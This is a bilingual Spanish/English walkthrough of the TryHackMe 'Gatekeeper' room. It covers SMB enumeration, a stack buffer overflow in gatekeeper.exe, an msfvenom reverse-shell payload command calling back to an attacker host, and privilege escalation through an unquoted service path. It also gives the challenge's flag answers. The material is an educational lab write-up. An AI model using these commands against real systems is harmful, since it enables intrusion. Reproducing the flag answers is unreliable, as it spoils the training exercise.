# Gatekeeper
| **Dificultad** | Medium |
| **Tipo** | CTF (Boot2Root Windows) |
| **Slug** | `gatekeeper` |
| **Link** | [TryHackMe](https://tryhackme.com/room/gatekeeper) |
| **Sección** | 02 Level Medium |
| **Fuente** | Web (TryHackMe room `gatekeeper` + walkthroughs públicos: The Uncommon Engineer, d3athcod3, Akbar Khan) |
| **Componentes** | Windows, SMB/Samba, buffer overflow de pila (x86), Immunity Debugger + mona.py, msfvenom, shellcode alineado, reverse shell, winPEAS/PEAS-ng, unquoted service path, escalada a SYSTEM |
| **Impacto** | Máquina Windows que exige explotar un **desbordamiento de pila** en un ejecutable (`gatekeeper.exe`) servido por SMB: se localiza el offset hasta EIP, se busca un `JMP ESP`, se inyecta shellcode con msfvenom y se obtiene shell; después se escala privilegios abusando de un **servicio con ruta sin comillas** hasta hacerse con `root`. |
---
**Contexto:** Gatekeeper es una room de dificultad media centrada en la explotación de un **buffer overflow de pila** en Windows. Se enumera SMB/Samba para localizar un share con la aplicación vulnerable (`gatekeeper.exe`), se descarga y se reproduce localmente en un entorno de debugging (**Immunity Debugger** + **mona.py**) para calcular el offset exacto hasta `EIP`, verificar la protección y generar el shellcode. El desbordamiento se lanza contra el servicio remoto, otorgando una shell; finalmente se enumera el sistema (winPEAS) y se escala a administrador explotando un **servicio con ruta sin comillas** para leer el flag final.
*EN: Gatekeeper is a medium Windows room focused on exploiting a **stack buffer overflow**. SMB/Samba is enumerated to find a share containing the vulnerable app (`gatekeeper.exe`), which is downloaded and reproduced locally in a debugging environment (**Immunity Debugger** + **mona.py**) to compute the exact offset to `EIP` and generate shellcode. The overflow is launched against the remote service to obtain a shell; afterwards the system is enumerated (winPEAS) and privileges are escalated via an **unquoted service path** to read the final flag.*
## Solucionario
### Task 1: Conexión / Deploy
**Explicación:** Despliegue de la máquina Windows y conexión a la red de TryHackMe. Tarea de preparación, sin respuesta.
*EN: Deploy the Windows machine and connect to the TryHackMe network. Preparation task, no answer.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Deploy the machine and connect to our network. | `No answer needed` |
### Task 2: Compromiso y Escalada / Compromise and Privilege Escalation
**Explicación:** Cadena de explotación:
1. **Enumeración.** `nmap` muestra SMB en `135/139/445` y el servicio vulnerable en `31337` (y RDP en `3389`). Se listan los recursos compartidos:
```bash
smbclient -L //<IP>
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
```
Se accede al share `Users` y se descarga `gatekeeper.exe` (aplicación vulnerable al desbordamiento).
2. **Fuzzing y offset.** Se ejecuta `gatekeeper.exe` en la VM de análisis con **Immunity Debugger** + `mona.py`, se envía un buffer creciente hasta desbordar `EIP`, se genera el patrón (`!mona pattern_create`) y se calcula el **offset** con `!mona pattern_offset`. Se busca un `JMP ESP` (`!mona jmp -r esp -m gatekeeper.exe`).
3. **Shellcode.** Con el offset y el `JMP ESP` se construye el payload con **msfvenom**:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x0a" -f python -v payload
```
Se envía al servicio en el puerto `31337` mediante un script Python (socket) obteniendo una **reverse shell**. El flag de usuario está en el escritorio del usuario `natbat`:
```
C:\Users\natbat\Desktop\user.txt.txt
```
4. **Escalada de privilegios.** Se sube `winPEAS`/`PEAS-ng` y se enumera. Se descubre un **servicio con ruta sin comillas** (*unquoted service path*); colocando un binario malicioso en la ruta intermedia y reiniciando el servicio se ejecuta código como `SYSTEM` y se lee el flag de root.
*EN: Exploitation chain: SMB enumeration and download of the vulnerable `gatekeeper.exe`; local replay with Immunity Debugger + mona to compute the EIP offset and a JMP ESP; msfvenom shellcode delivered over port 31337 for a reverse shell; user flag on natbat's desktop; privilege escalation via an unquoted service path (winPEAS) to SYSTEM and the root flag.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Locate and find the User Flag. | `{H4lf_W4y_Th3r3}` |
| 2 | Locate and find the Root Flag | `{Th3_M4y0r_C0ngr4tul4t3s_U}` |
---
**Metodología:** Enumeración SMB (nmap/smbclient) → descarga de la aplicación vulnerable → fuzzing local en Immunity Debugger + mona → cálculo de offset y búsqueda de `JMP ESP` → generación de shellcode (msfvenom) → explotación remota del buffer overflow → shell → user flag → enumeración con winPEAS → explotación de unquoted service path → root flag.
**Learning chain:** enumerar SMB → reproducir y depurar el binario → controlar EIP → inyectar shellcode → estabilizar la shell → escalar abusando de configuración de servicios.
**Lección:** *Un binario con un desbordamiento de pila accesible por red es un foothold directo; en Windows, los servicios con rutas sin comillas siguen siendo una vía clásica y fiable de escalada a SYSTEM.*
**MITRE ATT&CK:** T1046 (Network Service Discovery), T1135 (Network Share Discovery), T1203 (Exploitation for Client Execution), T1059.003 (Windows Command Shell), T1055 (Process Injection), T1574.009 (Path Interception by Unquoted Path), T1543.003 (Create or Modify System Process: Windows Service), T1005 (Data from Local System).
**Fuente:** [TryHackMe - Gatekeeper](https://tryhackme.com/room/gatekeeper)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
